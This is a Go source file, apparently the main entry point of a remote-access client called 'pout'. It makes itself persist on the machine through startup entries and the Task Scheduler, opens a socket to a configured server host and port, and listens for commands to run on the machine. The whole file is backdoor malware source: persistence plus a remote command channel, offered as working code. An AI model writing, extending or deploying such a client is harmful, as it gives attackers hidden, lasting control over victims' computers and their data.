package main

import (
	"github.com/codeuk/pout/client/cmd/socket"
	"github.com/codeuk/pout/client/cmd/system"
)

func main() {
	// Attempt to create persistence of the current executable on the machine.
	if StartupPersistence {
		system.CreateStartupPersistence(AppDataFileName, AppDataFolderName)
	}
	if SchedulerPersistence {
		system.CreateTaskSchedulerPersistence(AppDataFileName, AppDataFolderName)
	}

	// Create a new client socket connection to the passed server.
	// and listen for incoming commands to be executed on the machine.
	client := socket.Connect(socket.Server{ // Returns ClientSocket containing connection to server.
		Host: ServerHost,
		Port: ServerPort,
	})

	client.Listen() // Handle commands and persistence.
}
